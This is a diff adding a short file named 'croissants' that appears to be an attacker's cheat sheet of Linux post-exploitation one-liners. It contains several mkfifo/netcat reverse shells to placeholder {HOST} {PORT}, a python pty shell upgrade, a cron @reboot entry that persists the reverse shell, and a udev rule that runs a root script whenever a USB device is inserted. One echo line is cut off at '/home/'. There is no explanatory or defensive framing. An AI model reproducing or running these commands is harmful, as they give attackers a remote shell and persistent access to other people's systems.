@@ -1,0 +1,11 @@
+# croissants
+
+echo 'rm /tmp/ssh-t8vXomnqt8pE 2>/dev/null;mkfifo /tmp/ssh-t8vXomnqt8pE;(cat /tmp/ssh-t8vXomnqt8pE|/bin/bash 2>&1|nc {HOST} {PORT} >/tmp/ssh-t8vXomnqt8pE)&' >> /home/
+
+rm /tmp/ssh-test 2>/dev/null;mkfifo /tmp/ssh-test;(cat /tmp/ssh-test|/bin/bash 2>&1|nc {HOST} {PORT} >/tmp/ssh-test)&
+
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+echo "@reboot rm /tmp/ssh-UeAiR72tq6sN 2>/dev/null;mkfifo /tmp/ssh-UeAiR72tq6sN;(cat /tmp/ssh-UeAiR72tq6sN|/bin/bash 2>&1|nc {HOST} {PORT} >/tmp/ssh-UeAiR72tq6sN)& " >> /tmp/mycron
+
+echo 'ACTION=="add",ENV{DEVTYPE}=="usb_device",SUBSYSTEM=="usb",RUN+="/bin/bash /root/.script"' >> /etc/udev/rules.d/90-prevent-rubber.rules
